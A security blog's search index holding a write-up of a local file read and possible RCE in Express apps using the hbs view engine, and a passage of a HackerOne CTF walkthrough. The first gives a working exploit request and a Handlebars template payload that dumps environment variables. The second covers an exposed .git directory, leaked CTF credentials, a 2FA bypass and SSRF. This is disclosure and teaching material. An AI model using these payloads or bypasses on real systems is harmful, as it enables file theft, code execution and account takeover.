<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[The Secret Parameter, LFR, and Potential RCE in NodeJS Apps]]></title>
      <url>/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/</url>
      <content type="html"><![CDATA[<p><img src="./banner.png" alt=""></p>
<h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><p>If you are using ExpressJs with Handlebars as templating engine invoked via <a href="https://www.npmjs.com/package/hbs" target="_blank" rel="noopener">hbs</a> view engine, for Server Side Rendering, you are likely vulnerable to Local File Read (LFR) and potential Remote Code Execution (RCE).</p>
<h3 id="BugBountyTipüí∞"><a href="#BugBountyTipüí∞" class="headerlink" title="#BugBountyTipüí∞"></a>#BugBountyTipüí∞</h3><ol>
<li>If the target is responding with <code>X-Powered-By: Express</code> and there is HTML in responses, it‚Äôs highly likely that NodeJs with server-side templating is being used.</li>
<li>Add <code>layout</code> in your wordlist of parameter discovery/fuzzing for GET query or POST body. </li>
<li>If the arbitrary value of <code>layout</code> parameter added is resulting in <code>500 Internal Server Error</code> with <code>ENOENT: no such file or directory</code> in body, You have hit the LFR. </li>
</ol>
<h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>About more than a week back, I stumbled upon a critical Local File Read (LFR) security issue which had the potential to give Remote Code Execution in a fairly simple ~10 lines of <code>NodeJS/ExpressJs</code> code which looked like the following:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"> 	res.render(<span class="string">'index'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">'index'</span>, profile)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
<p><em>The whole source can be found <a href="https://github.com/CaptainFreak/Web-CTF-Challenges/tree/main/profiler" target="_blank" rel="noopener">here.</a></em></p>
<p>If you are even a little bit familiar with NodeJs Ecosystem and have written at least your first <code>Hello World</code> endpoint in <code>ExpressJs</code>, you will certify that this is clearly straightforward and innocent code.</p>
<p>So after getting surprised and disillusioned by the security bug, I remembered that It‚Äôs indeed called <strong><code>Dependency Hell</code></strong>. To be honest, I should not have been that surprised.</p>
<p>The betrayal by in-built modules, dependencies, and packages have been the reason to introduce numerous security bugs. This is a re-occurring theme in software security anyway.</p>
<p>To check out if this is a known issue or not, I created a CTF challenge and shared it with many of my talented friends belonging to multiple community forums of Web Security, Node, Backend Engineering, CTFs, and BugBounty.</p>
<p><blockquote class="twitter-tweet" data-lang="en" data-theme="dark"><p lang="en" dir="ltr">Node/Express.js Web Security Challenge:<a href="https://t.co/vjOUcxHdVx" target="_blank" rel="noopener">https://t.co/vjOUcxHdVx</a><br><br>Very short code: <a href="https://t.co/gkjcZ24YUt" target="_blank" rel="noopener">https://t.co/gkjcZ24YUt</a><br><br>Can you find the flag: ùó∞ùó≥ùóøùó≤ùóÆùó∏{.*}<a href="https://twitter.com/hashtag/nodejs?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#nodejs</a> <a href="https://twitter.com/hashtag/javascript?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#javascript</a> <a href="https://twitter.com/hashtag/JS?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#JS</a> <a href="https://twitter.com/hashtag/ctf?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#ctf</a> <a href="https://twitter.com/hashtag/bugbounty?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#bugbounty</a></p>&mdash; CaptainFreak (@0xCaptainFreak) <a href="https://twitter.com/0xCaptainFreak/status/1350083997854928897?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 15, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
<p>Turns out this was not known, Even after giving the whole <a href="https://github.com/CaptainFreak/Web-CTF-Challenges" target="_blank" rel="noopener">source code</a> of the challenge, only 4 people were able to solve it (all CTFers ü•≥):</p>
<ol>
<li><a href="https://twitter.com/JiriPospisil" target="_blank" rel="noopener">@JiriPospisil</a></li>
<li><a href="https://twitter.com/CurseRed" target="_blank" rel="noopener">@CurseRed</a></li>
<li><a href="https://github.com/Mrigank11" target="_blank" rel="noopener">@zevtnax</a></li>
<li><a href="https://twitter.com/po6ix" target="_blank" rel="noopener">@po6ix</a></li>
</ol>
<p>Congrats to all the solvers üéä and thanks a lot to everybody who tried out the challenge.</p>
<p>For the people who still wanna try out, I plan to keep the <a href="http://ctf.shoebpatel.com:9090/" target="_blank" rel="noopener">Profiler Challenge</a> up for one more week. Stop Reading and check it out now!</p>
<h2 id="Challenge-Solution"><a href="#Challenge-Solution" class="headerlink" title="Challenge Solution"></a>Challenge Solution</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'&#123;\"profile\":&#123;"layout\": \"./../routes/index.js\"&#125;&#125;' 'http://ctf.shoebpatel.com:9090/'</span><br></pre></td></tr></table></figure>
<p>HTTP request:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ctf.shoebpatel.com:9090</span><br><span class="line">Content-Length: 48</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;profile&quot;: &#123;</span><br><span class="line">    &quot;layout&quot;: &quot;./../routes/index.js&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>HTTP Response (content of <code>routes/index.js</code>):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 463</span><br><span class="line"></span><br><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line">var router = express.Router();</span><br><span class="line"></span><br><span class="line">const flag = &quot;cfreak&#123;It&apos;s called Dependency Hell for a reason! (https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L122)&#125;&quot;</span><br><span class="line"></span><br><span class="line">/* GET home page. */</span><br><span class="line">router.get(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line"> 	res.render(&apos;index&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line">	var profile = req.body.profile</span><br><span class="line"> 	res.render(&apos;index&apos;, profile)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure></p>
<p>Flag:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"cfreak&#123;It's called Dependency Hell for a reason! (https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L122)&#125;"</span></span><br></pre></td></tr></table></figure></p>
<p>That‚Äôs It! What the heck, right? You might be thinking, what even is this <code>layout</code> parameter? and where is it even coming from. Soo out of context! </p>
<p>If you like Code Review, why don‚Äôt you find out? It will be a good code review exercise.</p>
<h2 id="Secret-layout-parameter"><a href="#Secret-layout-parameter" class="headerlink" title="Secret layout parameter"></a>Secret <code>layout</code> parameter</h2><p>To find out from where it is coming, we can track the flow of our input from Source to Sink till we find out the reason why LFR is happening.</p>
<h4 id="Source-Line-3"><a href="#Source-Line-3" class="headerlink" title="Source (Line 3):"></a>Source (Line 3):</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">'index'</span>, profile)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs follow the path this profile object argument takes.</p>
<h4 id="Definition-of-res-render-in-ExpressJs-Link"><a href="#Definition-of-res-render-in-ExpressJs-Link" class="headerlink" title="Definition of res.render in ExpressJs. Link"></a>Definition of <code>res.render</code> in ExpressJs. <a href="https://github.com/expressjs/express/blob/master/lib/response.js#L989" target="_blank" rel="noopener">Link</a></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="keyword">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>‚Äúindex‚Äù argument became <code>view</code> &amp; our <code>profile</code> argument became the <code>options</code> parameter which became <code>opts</code> and got flown into <code>app.render</code></p>
<h4 id="Definition-of-req-app-render-in-ExpressJs-Link"><a href="#Definition-of-req-app-render-in-ExpressJs-Link" class="headerlink" title="Definition of req.app.render in ExpressJs. Link"></a>Definition of <code>req.app.render</code> in ExpressJs. <a href="https://github.com/expressjs/express/blob/master/lib/application.js#L531" target="_blank" rel="noopener">Link</a></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line">  ...</span><br><span class="line">  merge(renderOptions, opts);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> View = <span class="keyword">this</span>.get(<span class="string">'view'</span>);</span><br><span class="line">  </span><br><span class="line">  view = <span class="keyword">new</span> View(name, &#123;</span><br><span class="line">      defaultEngine: <span class="keyword">this</span>.get(<span class="string">'view engine'</span>),</span><br><span class="line">      root: <span class="keyword">this</span>.get(<span class="string">'views'</span>),</span><br><span class="line">      engines: engines</span><br><span class="line">    &#125;);</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="view-render-in-ExpressJs-Link"><a href="#view-render-in-ExpressJs-Link" class="headerlink" title="view.render in ExpressJs. Link"></a><code>view.render</code> in ExpressJs. <a href="https://github.com/expressjs/express/blob/master/lib/view.js#L133" target="_blank" rel="noopener">Link</a></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line">  debug(<span class="string">'render "%s"'</span>, <span class="keyword">this</span>.path);</span><br><span class="line">  <span class="keyword">this</span>.engine(<span class="keyword">this</span>.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>In View class, <code>this.engine</code> becomes an instance of  <a href="https://www.npmjs.com/package/hbs" target="_blank" rel="noopener">hbs</a> in our case and <code>this.path</code> = <code>rootViewDir + viewFilename</code>. The <code>options</code> argument is our <code>profile</code>.</p>
<h3 id="Sink-Instantiation-in-hbs-Link"><a href="#Sink-Instantiation-in-hbs-Link" class="headerlink" title="Sink: Instantiation in hbs. Link"></a>Sink: Instantiation in hbs. <a href="https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L29" target="_blank" rel="noopener">Link</a></h3><p>I will take the liberty here and modify the code a bit to make it linear and easy to understand, but you can check out the original version on Github.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">middleware</span>(<span class="params">filename, options, cb</span>) </span>&#123;</span><br><span class="line"><span class="comment">// The Culprit - https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L122</span></span><br><span class="line"><span class="keyword">var</span> layout = options.layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> view_dirs = options.settings.views;</span><br><span class="line"><span class="keyword">var</span> layout_filename = [].concat(view_dirs).map(<span class="function"><span class="keyword">function</span> (<span class="params">view_dir</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Some code to create full paths</span></span><br><span class="line">    <span class="keyword">var</span> view_path = path.join(view_dir, layout || <span class="string">'layout'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This actually restricts reading/executing files without extensions.</span></span><br><span class="line">    <span class="keyword">if</span> (!path.extname(view_path)) &#123;</span><br><span class="line">      view_path += extension;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> view_path;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">tryReadFileAndCache(layout_filename);</span><br><span class="line"></span><br><span class="line"><span class="comment">// in-memory caching Code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryReadFileAndCache</span>(<span class="params">templates</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> template = templates.shift();</span><br><span class="line">    fs.readFile(template, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, str</span>) </span>&#123;</span><br><span class="line">      cacheAndCompile(template, str);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cacheAndCompile</span>(<span class="params">filename, str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Here we get compiled HTML from handlebars</span></span><br><span class="line">    <span class="keyword">var</span> layout_template = handlebars.compile(str);</span><br><span class="line">    <span class="comment">// Some further logic</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can stop analysing here, as you can see on <code>Line 22</code> we effectively read from the <code>Root Views Dir + layout</code> and pass it to <a href="https://github.com/handlebars-lang/handlebars.js#usage" target="_blank" rel="noopener">handlebars.compile</a> which gives us the HTML after compiling the given file which we completely control (Except the extension cause it‚Äôs added explicitly from the config to the path if not provided already. <code>Line. 12</code>). </p>
<p>Hence the LFR, <strong>we can read any files with extensions.</strong></p>
<h2 id="RCE-üí£"><a href="#RCE-üí£" class="headerlink" title="RCE üí£"></a>RCE üí£</h2><p>As the templating is involved, we do have a strong potential for RCE. It has the following pre-requisites though:</p>
<ol>
<li>Through the above LFR read <code>./../package.json</code>.</li>
<li>See the version of hbs being used, it should be &lt;= <code>4.0.3</code>.  Because after this version, the <code>hbs</code> team started using <code>Handlebars.js of version &gt;= 4.0.14</code>, <a href="https://github.com/pillarjs/hbs/blob/5d71299ea6309452975a379cf9c156245f9cb6f8/package.json" target="_blank" rel="noopener">Commit Link</a>. </li>
<li>In Handlebars below this version, it was possible to create RCE payloads. There is an <a href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html" target="_blank" rel="noopener">awesome writeup</a> on this by <a href="https://twitter.com/Zombiehelp54" target="_blank" rel="noopener">@Zombiehelp54</a> with which they got RCE on Shopify.</li>
<li>And you should have a functionality of file upload on the same box with a known location, which is quite an ask considering everybody uses blob storage these days, but we never know ü§∑‚Äç‚ôÇÔ∏è</li>
</ol>
<p>With above fulfilled, you can write a handlebars template payload like below to get RCE:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- (by [@avlidienbrunn](https://twitter.com/avlidienbrunn)) --&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;this.push &quot;return JSON.stringify(process.env);&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;this&#125;&#125;</span><br><span class="line">          &#123;&#123;/with&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/with&#125;&#125;</span><br><span class="line">    &#123;&#123;/with&#125;&#125;</span><br><span class="line">  &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Fix-ü§ï"><a href="#Fix-ü§ï" class="headerlink" title="Fix ü§ï"></a>Fix ü§ï</h2><p>Easy fix would be to stop using the code anti-pattern shown in the above example like below:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‚ùå res.render(&apos;index&apos;, profile)</span><br></pre></td></tr></table></figure>
<p>v/s</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‚úÖ res.render(&apos;index&apos;, &#123; profile &#125;)</span><br></pre></td></tr></table></figure>
<p>which I think many devs use already so that they can be more descriptive in templates with the usage of just ‚Äú&lbrace;&lbrace;name&rbrace;&rbrace;‚Äù vs ‚Äú&lbrace;&lbrace;profile.name&rbrace;&rbrace;‚Äù.</p>
<p>But think for a second again, is the above code safe? Yea sure, we don‚Äôt have a way to provide <code>layout</code> in the options argument to <code>res.render</code> anymore. But is there any way to still introduce the culprit <code>layout</code> parameter?</p>
<h3 id="Prototype-Pollution"><a href="#Prototype-Pollution" class="headerlink" title="Prototype Pollution!"></a>Prototype Pollution!</h3><p>It would be ignorant if we don‚Äôt mention proto pollution in a Js/NodeJs Web Security writeup üôÉ !</p>
<p>Readers who are unaware of proto pollution, please watch this <a href="https://www.youtube.com/watch?v=LUsiFV3dsK8" target="_blank" rel="noopener">awesome talk</a> from Olivier Arteau at NorthSec18.</p>
<p>As you can see, even the most common pattern (<code>res.render(&#39;template&#39;, { profile })</code>) of passing objects to render function is not safe, If the application has prototype pollution at any place with which an attacker can add <code>layout</code> to prototype chain, the output of every call to <code>res.render</code> will be overwritten with LFR/RCE. So we have DoS-ish LFR/RCE! With presence of exploitable proto pollution, this becomes quite a good gadget plus becomes unfixable unless we fix proto pollution.</p>
<p><strong>Solid Fix</strong></p>
<ol>
<li>First fix proto pollution if you are vulnerable to it.</li>
<li>and you can remove the <code>layout</code> key from the object or do whatever to stop it from reaching that vulnerable Sink.</li>
</ol>
<p>Let me know what you think should be the proper fix?</p>
<hr>
<p>Above I have described my observations on a potentially critical vulnerability in the Setup of <strong>NodeJS + Express + HBS</strong>. </p>
<p>As this setup is pretty common, I wanted this writeup to be out there. The handlebars engine particularly is very popular due to it‚Äôs support of HTML symantics. Everytime I work on a side-project, I quickly setup the boilerplate code with quick one liner of <a href="https://expressjs.com/en/starter/generator.html" target="_blank" rel="noopener">express-generator cli</a> <code>express --view hbs</code> and this creates the exact same stack the above issue is talking about. Don‚Äôt know how many time I might have used that code line myself. I plan to do the same kind of review for other view engines that express supports (ejs, hjs, jade, pug, twig, vash).</p>
<p>Anyways, thanks for Reading! If something is erroneous, please let me know, would love to have a constructive discussion. </p>
<p>It‚Äôs called Dependency Hell for a reason!</p>
<p>Best,<br>CF</p>
]]></content>
      
        
        <tags>
            
            <tag> WebSecurity </tag>
            
            <tag> Hacking </tag>
            
            <tag> NodeJs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HackerOne-2006 CTF Writeup]]></title>
      <url>/2020/06/19/HackerOne-2006-CTF-Writeup/</url>
      <content type="html"><![CDATA[<h1 id="HackerOne-2006-CTF-Writeup"><a href="#HackerOne-2006-CTF-Writeup" class="headerlink" title="HackerOne-2006 CTF Writeup"></a>HackerOne-2006 CTF Writeup</h1><p>After playing quite an amount of CTFs till date, I can really say that this was one of the extraordinary ones and it is quite visible once you consider the magnitude of logical deductions it required to follow the right path and not the rabbit holes and the effort taken in arranging the stable infrastructure required. Thanks, Hackerone, and the Authors for amazing 24 hours of intellectual satisfaction which was much needed in the lockdown. It felt good to be in the <a href="https://twitter.com/adamtlangley/status/1266983209994199040?s=20" target="_blank" rel="noopener">Top 5s to crack this</a>. </p>
<p>An Unorthodox CTF requires an Unorthodox writeup hence it will be a summarised walkthrough of my thought process. The Hackerone Report submiited can be found here <a href="https://hackerone.com/reports/887766" target="_blank" rel="noopener">#887766</a></p>
<p>For the people who actively tried and could not solve till the end, an illustrative TL;DR will be fine:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/tldr.png" title="TLDR">
<p>In a nutshell, Solution has 8 steps:</p>
<h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><ol>
<li>Initial Recon</li>
<li>Exposed .git directory</li>
<li>Login 2FA Bypass</li>
<li>Server-Side Request Forgery</li>
<li>Android Challenges</li>
<li>API + OSINT</li>
<li>Privilege Escalation</li>
<li>Stealing Payment 2FA Code using CSS</li>
</ol>
<h2 id="Initial-Recon"><a href="#Initial-Recon" class="headerlink" title="Initial Recon"></a>Initial Recon</h2><p>As soon as hacker sees the <strong>*wildcard</strong>,</p>
<p><img src="./scope.png" alt=""></p>
<p>We do Recon &amp; <a href="https://github.com/projectdiscovery/subfinder" target="_blank" rel="noopener">Subfinder</a> yeilds:</p>
<table>
<thead>
<tr>
<th>SubDomains</th>
<th>Notes Taken</th>
</tr>
</thead>
<tbody>
<tr>
<td>bountypay.h1ctf.com</td>
<td>Static Home Page.</td>
</tr>
<tr>
<td>app.bountypay.h1ctf.com</td>
<td>For Customers Use, Marten is one of em.</td>
</tr>
<tr>
<td>staff.bountypay.h1ctf.com</td>
<td>For BountyPay employees probably.</td>
</tr>
<tr>
<td>api.bountypay.h1ctf.com</td>
<td>Hmm, The API service for above two. Has <strong>Open Redirect</strong>, Might be for chaining laterü§î</td>
</tr>
<tr>
<td>software.bountypay.h1ctf.com</td>
<td>Interesting one, Can‚Äôt be accessed directly due to IP whitelist, I smell <strong>SSRF</strong>.</td>
</tr>
</tbody>
</table>
<p>In the text ahead, I will address the subdomains as separate entities (Ex. app.bountypay.h1ctf.com will be just <code>App</code>)</p>
<h2 id="Exposed-git-directory"><a href="#Exposed-git-directory" class="headerlink" title="Exposed .git directory"></a>Exposed .git directory</h2><p>After trying usual bugs of Auth Bypass in attempts to login into App and Staff, we are just left with more content discovery, and doing usual <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/git.png" title="git">
<p>We find that some part of the .git directory is exposed on App for us to analyze. Looking into these files, we get a reference to a public Github Repo of BountyPay(<a href="https://github.com/bounty-pay-code/request-logger.git" target="_blank" rel="noopener">bounty-pay-code/request-logger</a>). This repo leaks a path(<a href="https://app.bountypay.h1ctf.com/bp_web_trace.log" target="_blank" rel="noopener">/bp_web_trace.log</a>) where logs are stored for the App. The logs contain login credentials of a BountyPay Customer Brian Oliver(<strong>brian.oliver:V7h0inzX</strong>). Now we have a session on App I guess.</p>
<h2 id="Login-2FA-Bypass"><a href="#Login-2FA-Bypass" class="headerlink" title="Login 2FA Bypass"></a>Login 2FA Bypass</h2><p>No No, Not so fast! BountyPay is secure. They have Login 2FA to save their customers üôÉ. The App sends a 2FA code to the customer‚Äôs phone.</p>
<p>The POST request for submitting 2FA code had 4 parameters.<br>Username, Password, <strong>Challenge</strong> &amp; <strong>Challenge_Answer</strong>.</p>
<p>The Challenge_Answer param is supposed to be the 2FA code. In the very first attempt after verifying that the weird Challenge Param is of length 32, I sort of guessed that this is <strong>md5 of answer</strong> and as the App is taking this from client-side, we might be able to submit <strong>our own challenge according to our own answer</strong> and fool the App, and BOOM. It just worked. Now we are logged In with Brian‚Äôs Creds on the App.</p>
<h2 id="Server-Side-Request-Forgery"><a href="#Server-Side-Request-Forgery" class="headerlink" title="Server Side Request Forgery"></a>Server Side Request Forgery</h2><p>POST-Succesfull Auth, App creates a Base64 encoded JSON cookie: <code>token</code>,  which after decoding looks like:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"account_id"</span>:<span class="string">"F8gHiqSdpK"</span>,<span class="attr">"hash"</span>:<span class="string">"de235bffd23df6995ad4e0930baac1a2"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>After fuzzing both params, we come to know that App is using <code>hash</code> for the session and <code>account_id</code> for creating URI for the server-side request to API endpoint for getting the Bounty Payment data for Brian‚Äôs account_id <code>F8gHiqSdpK</code>(App very generously gives away the endpoint in the HTTP response of /statements?month=05&amp;year=2020)</p>
